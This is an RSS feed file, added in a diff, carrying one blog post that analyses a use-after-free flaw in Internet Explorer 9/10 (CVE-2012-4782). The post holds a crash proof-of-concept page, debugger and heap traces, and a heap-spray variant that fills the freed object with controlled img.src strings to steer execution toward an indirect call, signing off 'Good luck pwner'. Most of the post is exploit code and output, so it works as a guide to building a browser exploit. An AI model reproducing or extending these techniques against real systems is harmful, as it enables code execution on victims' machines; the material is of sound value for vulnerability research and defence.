@@ -1,0 +1,232 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+   
+   	<title>RealJenius.com - Tag: 0day</title>
+   
+   <link>http://realjenius.com</link>
+   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
+   <language>en-us</language>
+   <managingEditor>R.J. Lorimer</managingEditor>
+   <atom:link href="rss" rel="self" type="application/rss+xml" />
+   
+	<item>
+  <title>CMarkup Use After Free Vulnerability &#8211; CVE-2012-4782</title>
+  <link>http://realjenius.com/research/2013/01/10/cmarkup-use-after-free-vulnerability-cve-2012-4782.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2013-01-10T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2013/01/10/cmarkup-use-after-free-vulnerability-cve-2012-4782.html</guid>
+  <description><![CDATA[
+     <p>Latest M$ tuesday patch kill one of my 0day in Microsoft Internet Explorer 9/10. So I decided release Proof Of Concept code and writeup some analyze about this bug. Hope it helpful.</p>
+
+<p>Here is the PoC:</p>
+
+<pre class="brush: xml; title: ; notranslate" title="">&lt;!doctype html&gt;
+&lt;html&gt;
+        &lt;head&gt;
+                &lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" /&gt;
+               &lt;script&gt;
+                       function testcase(){
+                                document.body.appendChild(document.createElement('progress'));
+                                document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
+                                document.body.appendChild(document.createElement('progress'));
+                                document.body.appendChild(document.createElement('table'));
+                                document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
+                            document.getElementsByTagName('progress').item(0).appendChild(document.createElement('frameset'));
+                                document.getElementsByTagName('track').item(0).offsetWidth;
+
+                                document.getElementsByTagName('progress').item(1).appendChild(document.getElementsByTagName('track').item(0));
+                                document.body.appendChild(document.createElement("&lt;ins style='margin-left:2222222222px'&gt;&lt;/ins&gt;"));
+
+                &lt;/script&gt;
+        &lt;/head&gt;
+        &lt;body onload='testcase();'&gt;
+
+        &lt;/body&gt;
+&lt;/html&gt;
+</pre>
+
+<p>After running this html we’ve got a nice crash:<br />
+<code>(fcc.354): Access violation - code c0000005 (!!! second chance !!!)&lt;br /&gt;
+eax=0b7befc0 ebx=088cd6b8 ecx=0b6b2fa8 edx=00000006 esi=0b6b2fa8 edi=00000000&lt;br /&gt;
+eip=639927e9 esp=088cd1c8 ebp=088cd1d0 iopl=0         nv up ei pl nz na po nc&lt;br /&gt;
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202&lt;br /&gt;
+MSHTML!CTreeNode::GetFancyFormat+0xc:&lt;br /&gt;
+639927e9 0fb74640        movzx   eax,word ptr [esi+40h]   ds:0023:0b6b2fe8=0000&lt;br /&gt;
+0:017&gt; u&lt;br /&gt;
+MSHTML!CTreeNode::GetFancyFormat+0xc:&lt;br /&gt;
+639927e9 0fb74640        movzx   eax,word ptr [esi+40h]&lt;br /&gt;
+639927ed 6685c0          test    ax,ax&lt;br /&gt;
+</code></p>
+
+<p>Now using my binary instrumentation framework (a PIN based instrumentation which could do things like: crash analyze, taint tracing, code coverage..), I could get the following output</p>
+
+<p><code>&lt;br /&gt;
+Exception Point: 639927e9 0fb74640        movzx   eax,word ptr [esi+40h]&lt;br /&gt;
+Current Register:&lt;br /&gt;
+eax:0b7befc0&lt;br /&gt;
+esi:0b6b2fa8&lt;br /&gt;
+Backtrace analyze:&lt;br /&gt;
+[+]639927e7 -&gt; esi: 0b6b2fa8 | ecx: 0b6b2fa8&lt;br /&gt;
+[+]639927e5 -&gt; ecx: 0b6b2fa8&lt;br /&gt;
+[+]636c1d2d -&gt; ecx:0b6b2fa8&lt;br /&gt;
+[+]639ae295 -&gt; esi: 0b6b2fa8&lt;br /&gt;
+===================&lt;br /&gt;
+Detect Freed Address: 0b6b2fa8 at EIP 639AE299&lt;br /&gt;
+With param: HeapFree(150000,23,0b6b2fa8)&lt;br /&gt;
+</code></p>
+
+<p>So it is a pretty nice Used After Free vulnerability. But what is freed?</p>
+
+<p>Run the tool again, this time to collect information about Heap Allocate, I can see:<br />
+<code>&lt;br /&gt;
+.....&lt;br /&gt;
+Detect Heap Allocate : 638f13dc&lt;br /&gt;
+With Param: HeapAlloc(150000, 8u, 0x54)&lt;br /&gt;
+Return value: 0b6b2fa8</code></p>
+
+<p>And it occur in function:<br />
+<code>CMarkup::InsertElementInternal</code><br />
+So now we can use a little trick to manipulate freed address:</p>
+
+<pre class="brush: xml; title: ; notranslate" title="">&lt;!doctype html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" /&gt;
+
+		&lt;script&gt;
+
+                function testcase(){
+
+				var img = new Array();
+				  for(var i = 0;i &lt; 100;i++){
+				  	img[i] = document.createElement('img');
+				  	img[i]["src"] = "a";
+				  }
+				document.body.appendChild(document.createElement('progress'));
+				document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
+				document.body.appendChild(document.createElement('progress'));
+				document.body.appendChild(document.createElement('table'));
+				document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
+			    document.getElementsByTagName('progress').item(0).appendChild(document.createElement('frameset'));
+				document.getElementsByTagName('track').item(0).offsetWidth;
+
+				document.getElementsByTagName('progress').item(1).appendChild(document.getElementsByTagName('track').item(0));
+				document.body.appendChild(document.createElement("&lt;ins style='margin-left:2222222222px'&gt;&lt;/ins&gt;"));
+
+				window.scroll(500);
+
+				for(var j = 0;j &lt; 99;j++){
+				 	img[j]["src"] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";}
+
+				 }
+
+		&lt;/script&gt;
+	&lt;/head&gt;
+	&lt;body onload='testcase();'&gt;
+
+	&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+
+<p>And we’ve got:<br />
+<code>&lt;br /&gt;
+(c10.d88): Access violation - code c0000005 (!!! second chance !!!)&lt;br /&gt;
+eax=00000041 ebx=088cd6b8 ecx=00410041 edx=ff000000 esi=0c53efa8 edi=00000000&lt;br /&gt;
+eip=639927ff esp=088cd1c8 ebp=088cd1d0 iopl=0         nv up ei pl nz na pe nc&lt;br /&gt;
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206&lt;br /&gt;
+MSHTML!CTreeNode::GetFancyFormat+0x1e:&lt;br /&gt;
+639927ff 8b4a2c          mov     ecx,dword ptr [edx+2Ch] ds:0023:ff00002c=????????&lt;br /&gt;
+0:017&gt; dd esi&lt;br /&gt;
+0c53efa8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53efb8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53efc8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53efd8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53efe8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c53eff8  00410041 d0d00000 ???????? ????????&lt;br /&gt;
+0c53f008  ???????? ???????? ???????? ????????&lt;br /&gt;
+0c53f018  ???????? ???????? ???????? ????????&lt;br /&gt;
+0:017&gt; dd 410041&lt;br /&gt;
+00410041  b341be78 7274f8ac 18ea3e88 3c00005c&lt;br /&gt;
+00410051  ff000000 4dffffff cbb7a93b b0487827&lt;br /&gt;
+00410061  ebd03627 48a7a85f 3d00005c ff000000&lt;br /&gt;
+00410071  98ffffff 9b1b1704 a14da1bb 315fec5b&lt;br /&gt;
+00410081  74f7c784 3e00005c ff000000 f0ffffff&lt;br /&gt;
+00410091  0d343fb3 ae43076f 1b2599a9 a86d9aad&lt;br /&gt;
+004100a1  3f00005c ff000000 93ffffff ddca1f10&lt;br /&gt;
+004100b1  844c01b0 ebee76ab dc391fca 4000005c&lt;br /&gt;
+0:017&gt; u&lt;br /&gt;
+</code><br />
+Why it crashing here:<br />
+<code>&lt;br /&gt;
+.text:639927E9                 movzx   eax, word ptr [esi+40h]&lt;br /&gt;
+.text:639927ED                 test    ax, ax&lt;br /&gt;
+.text:639927F0                 js      loc_63842DAE&lt;br /&gt;
+.text:639927F6                 mov     ecx, [esi+50h]&lt;br /&gt;
+.text:639927F9                 mov     edx, [ecx+80h]&lt;br /&gt;
+.text:639927FF                 mov     ecx, [edx+2Ch]</code><br />
+Since we can control esi, we can force program to jump 63842DAE by changing some bytes in img.src:<br />
+<code>&lt;br /&gt;
+..&lt;br /&gt;
+img[j]["src"] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAu8141u4141AAAAAAAA";}&lt;br /&gt;
+....&lt;br /&gt;
+</code></p>
+
+<p><code>&lt;br /&gt;
+(614.fd4): Access violation - code c0000005 (!!! second chance !!!)&lt;br /&gt;
+eax=00000000 ebx=00000000 ecx=00410041 edx=b341be78 esi=088ccc00 edi=0c540fa8&lt;br /&gt;
+eip=6383a61a esp=088ccbe0 ebp=088ccbf0 iopl=0         nv up ei pl zr na pe nc&lt;br /&gt;
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246&lt;br /&gt;
+MSHTML!CTreeNode::ComputeFormats+0xa1:&lt;br /&gt;
+6383a61a 8b82c4000000    mov     eax,dword ptr [edx+0C4h] ds:0023:b341bf3c=????????&lt;br /&gt;
+0:017&gt; dd edi&lt;br /&gt;
+0c540fa8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c540fb8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c540fc8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c540fd8  00410041 00410041 00410041 00410041&lt;br /&gt;
+0c540fe8  41418141 00410041 00410041 00410041&lt;br /&gt;
+0c540ff8  00410041 d0d00000 ???????? ????????&lt;br /&gt;
+0c541008  ???????? ???????? ???????? ????????&lt;br /&gt;
+0c541018  ???????? ???????? ???????? ????????&lt;br /&gt;
+0:017&gt; dd ecx&lt;br /&gt;
+00410041  b341be78 7274f8ac 18ea3e88 3c00005c&lt;br /&gt;
+00410051  ff000000 4dffffff cbb7a93b b0487827&lt;br /&gt;
+00410061  ebd03627 48a7a85f 3d00005c ff000000&lt;br /&gt;
+00410071  98ffffff 9b1b1704 a14da1bb 315fec5b&lt;br /&gt;
+00410081  74f7c784 3e00005c ff000000 f0ffffff&lt;br /&gt;
+00410091  0d343fb3 ae43076f 1b2599a9 a86d9aad&lt;br /&gt;
+004100a1  3f00005c ff000000 93ffffff ddca1f10&lt;br /&gt;
+004100b1  844c01b0 ebee76ab dc391fca 4000005c&lt;br /&gt;
+</code></p>
+
+<p>And we change edi:<br />
+<code>&lt;br /&gt;
+img[j]["src"] = "AAAAAAAAAAAAAAAAAAAAAAAAu5555u5555AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAu8141u4141AAAAAAAA";}&lt;br /&gt;
+</code></p>
+
+<p>And Boom:<br />
+<code>&lt;br /&gt;
+eax=00000000 ebx=00000000 ecx=55555555 edx=640386e0 esi=088ccc00 edi=0c678fa8&lt;br /&gt;
+eip=6383a618 esp=088ccbe0 ebp=088ccbf0 iopl=0         nv up ei pl zr na pe nc&lt;br /&gt;
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246&lt;br /&gt;
+MSHTML!CTreeNode::ComputeFormats+0x9f:&lt;br /&gt;
+6383a618 8b11            mov     edx,dword ptr [ecx]  ds:0023:55555555=????????&lt;br /&gt;
+0:017&gt; u&lt;br /&gt;
+MSHTML!CTreeNode::ComputeFormats+0x9f:&lt;br /&gt;
+6383a618 8b11            mov     edx,dword ptr [ecx]&lt;br /&gt;
+6383a61a 8b82c4000000    mov     eax,dword ptr [edx+0C4h]&lt;br /&gt;
+6383a620 ffd0            call    eax&lt;br /&gt;
+6383a622 8b400c          mov     eax,dword ptr [eax+0Ch]&lt;br /&gt;
+6383a625 57              push    edi&lt;br /&gt;
+6383a626 893e            mov     dword ptr [esi],edi&lt;br /&gt;
+6383a628 894604          mov     dword ptr [esi+4],eax&lt;br /&gt;
+6383a62b 8b0f            mov     ecx,dword ptr [edi]</code></p>
+
+<p>Good luck pwner :p</p>
+
+  ]]></description>
+</item>
+
+</channel>
+</rss>
